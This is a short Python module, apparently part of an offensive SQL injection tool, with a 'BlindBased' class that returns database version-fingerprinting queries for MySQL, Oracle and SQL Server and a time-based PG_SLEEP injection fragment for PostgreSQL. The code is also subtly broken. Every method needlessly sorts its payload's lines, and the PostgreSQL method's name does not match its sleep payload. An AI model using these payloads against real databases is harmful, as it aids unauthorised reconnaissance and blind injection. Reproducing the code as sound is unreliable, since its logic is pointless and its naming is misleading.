class BlindBased:
    @staticmethod
    def mysql_version_query():
        payload = """
SELECT substring(version(),1,1)=5

"""
        rows = payload.split("\n") 
        sorted_rows = sorted(rows) 
        sorted_payload = "\n".join(sorted_rows)
        return sorted_payload
    
    @staticmethod
    def oracle_version_query():
        payload = """
SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';
"""
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)
        return sorted_payload
    

    @staticmethod 
    def sql_server_version_query():
        payload = """
SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'

"""
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)
        return sorted_payload
    

    @staticmethod
    def postgre_sql_payload_version_query():
        payload = """
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))

"""
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)
        return sorted_payload